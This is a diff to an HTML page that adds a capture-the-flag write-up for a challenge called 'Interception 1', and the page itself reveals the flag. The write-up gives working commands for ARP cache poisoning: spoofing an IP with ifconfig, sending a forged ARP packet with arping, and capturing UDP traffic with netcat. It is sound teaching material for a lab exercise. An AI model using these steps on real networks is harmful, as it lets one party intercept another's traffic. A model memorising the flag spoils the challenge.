@@ -39,7 +39,7 @@
       
       <h2 id="BinEx" style="margin-bottom:0px;">Binary Exploitation</h2>
       <div class="post">
-
+        
       </div>
       <h2 id="Crypto" style="margin-bottom:0px;">Cryptography</h2>
       <div class="post">
@@ -62,8 +62,27 @@
 
       </div>
       <h2 id="Other" style="margin-bottom:0px;">Other</h2>
-      <div class="post">
-
+      <div class="post" style="font-weight:bold;">
+        <center>
+          <h3>Interception 1</h3>
+        </center>
+        <blockquote>
+          <p><em>192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.</em></p>
+          <code><em>ssh ctf-1@host.cg21.metaproblems.com -p 7000</em></code>
+        </blockquote>
+        <p>This challenge requires a simple ARP cache poisoning attack.</p>
+        <p>The first step in this process is to set a secondary IP in our network interface to use in the attack.</p>
+        <code>/sbin/ifconfig eth0:10 192.168.0.2 up</code>
+        <p>This the IP that is recieving information in the challenge prompt, so this is the IP we want to spoof.</p>
+        <p>The next step is to use arping to send a fictitious ARP packet claiming 192.168.0.2 belongs to our IP.</p>
+        <code>arping -c 1 -U -s 192.168.0.2 192.168.0.1</code>
+        <p>From this point on the IP 192.168.0.1 will be sending the flag over port 8000/udp to our machine.</p>
+        <p>The final step is to set up a port listener on port 8000/udp to retrieve the flag.</p>
+        <code>nc -lu 8000</code>
+        <details style="margin-top:8px;">
+          <summary>Reveal Flag</summary>
+          <p style="margin-top:8px;">MetaCTF{addr3s5_r3s0lut1on_pwn4g3}</p>
+        </details>
       </div>
     </div>
 
